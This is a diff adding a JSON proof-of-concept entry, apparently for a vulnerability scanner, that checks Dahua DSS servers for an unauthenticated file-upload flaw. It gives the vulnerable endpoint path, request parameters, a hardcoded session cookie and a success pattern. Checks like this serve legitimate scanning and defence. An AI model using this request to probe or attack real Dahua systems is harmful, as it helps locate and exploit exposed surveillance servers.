@@ -1,0 +1,16 @@
+{
+  "name":"大华DSS前台文件上传",
+  "tag":"dahua",
+  "type":"upload",
+  "poc": {
+    "pocGet": "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}",
+    "pocPost": "id=1",
+    "header": {
+      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryGcEYB5EKXKmZXB0R",
+      "User-Agent": "Mozilla/5.0 (Linux;"
+    },
+    "status_code":"200",
+    "pattern": "(\"status\":200)"
+  }
+}
